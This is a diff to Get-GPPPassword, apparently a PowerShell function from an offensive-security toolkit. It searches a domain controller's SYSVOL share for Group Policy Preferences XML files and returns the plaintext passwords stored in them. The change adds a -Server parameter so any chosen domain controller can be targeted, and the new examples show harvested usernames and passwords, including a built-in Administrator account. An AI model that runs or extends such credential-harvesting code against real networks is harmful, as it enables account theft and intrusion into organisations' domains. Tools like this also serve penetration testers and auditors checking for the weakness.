@@ -12,7 +12,12 @@ function Get-GPPPassword {
  
 .DESCRIPTION
 
-    Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
+    Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
+
+.PARAMETER Server
+    
+    Specify the domain controller to search for. 
+    Default's to the users current domain
 
 .EXAMPLE
 
@@ -43,6 +48,21 @@ function Get-GPPPassword {
     File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
 
 .EXAMPLE
+    PS C:\> Get-GPPPassword -Server EXAMPLE.COM
+
+    NewName   : [BLANK]
+    Changed   : {2014-02-21 05:28:53}
+    Passwords : {password12}
+    UserNames : {test1}
+    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB982DA}\MACHINE\Preferences\DataSources\DataSources.xml
+
+    NewName   : {mspresenters}
+    Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
+    Passwords : {Recycling*3ftw!, password123, password1234}
+    UserNames : {Administrator (built-in), DummyAccount, dummy2}
+    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB9AB12}\MACHINE\Preferences\Groups\Groups.xml
+
+.EXAMPLE
 
     PS C:\> Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
     
@@ -63,7 +83,11 @@ function Get-GPPPassword {
 #>
     
     [CmdletBinding()]
-    Param ()
+    Param (
+            [ValidateNotNullOrEmpty()]
+            [String]
+            $Server = $Env:USERDNSDOMAIN
+    )
     
     #Some XML issues between versions
     Set-StrictMode -Version 2
@@ -109,7 +133,7 @@ function Get-GPPPassword {
     function Get-GPPInnerFields {
     [CmdletBinding()]
         Param (
-            $File 
+            $File
         )
     
         try {
@@ -204,10 +228,10 @@ function Get-GPPPassword {
         if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
             throw 'Machine is not a domain member or User is not a member of the domain.'
         }
-    
+
         #discover potential files containing passwords ; not complaining in case of denied access to a directory
-        Write-Verbose 'Searching the DC. This could take a while.'
-        $XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
+        Write-Verbose "Searching \\$Server\SYSVOL. This could take a while."
+        $XMlFiles = Get-ChildItem -Path "\\$Server\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
     
         if ( -not $XMlFiles ) {throw 'No preference files found.'}
 
